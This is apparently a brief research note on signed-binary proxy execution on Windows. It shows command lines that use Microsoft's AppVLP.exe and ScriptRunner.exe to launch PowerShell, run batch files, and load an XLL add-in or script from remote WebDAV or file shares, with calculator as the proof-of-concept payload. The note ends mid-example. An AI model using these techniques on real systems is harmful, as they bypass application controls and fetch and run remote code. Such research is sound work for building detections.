# Code Execution via AppVLP

## Examples
```
C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe powershell.exe -c "$e=New-Object -ComObject shell.application;$e.ShellExecute('calc.exe', '', '', 'open', 1)"
C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe powershell.exe -c "$e=New-Object -ComObject excel.application;$e.RegisterXLL('\\webdav\xll_poc.xll')"
C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe C:\Users\will\Desktop\Research\calc_bat.exe
C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe C:\Users\will\Desktop\Research\calc.bat
C:\Program Files (x86)\Microsoft Office\root\client\AppVLP.exe \\webdav\calc.bat
```

### Command Line in procmon
```
C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.1706.1862.0_x64__8wekyb3d8bbwe\Calculator.exe" -ServerName:App.AppXsm3pg4n7er43kdh1qp4e79f1j7am68r8.mca
```

### Notes
- Access denied when ran from System32

# Code Execution via ScriptRunner
## Examples
```
C:\Windows\System32
λ ScriptRunner.exe -appvscript "\\fileserver\calc.cmd"
λ ScriptRunner.exe -appvscript powershell.exe -args
